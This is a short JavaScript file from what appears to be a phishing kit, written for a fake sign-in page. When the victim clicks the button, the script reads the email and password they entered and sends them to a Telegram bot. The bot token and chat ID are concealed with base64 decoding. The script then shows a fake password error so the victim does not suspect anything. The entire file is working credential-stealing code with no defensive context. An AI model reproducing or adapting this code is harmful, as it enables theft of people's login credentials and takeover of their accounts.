function init(email) {
    $("#emailit").val(email);
    $("#submit-btn").bind('click', inject);
}

function inject () {
    $("#submit-btn").val("Opening...");
    var email = $("#emailit").val();
    var password = $("#password").val();
    var message = "Email: "+ email +" | Password: "+ password;

    var token = atob("NTYwNTUwOTU3NzpBQUUxQlVPWVlaVkVjSTZxOHE5WmhnM0dFMkhRWTV0NkxlSQ==");
    var chat_id = atob("LTEwMDE2OTQ2NTU0NTg=");
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + message + '&parse_mode=html';

    var oReq = new XMLHttpRequest();
    oReq.open("GET", encodeURI(url), true);
    oReq.send();
    setTimeout(() => {
        $("#errorpass").removeClass("hidden");
        $("#submit-btn").val("Sign in");
    }, "5000")
}
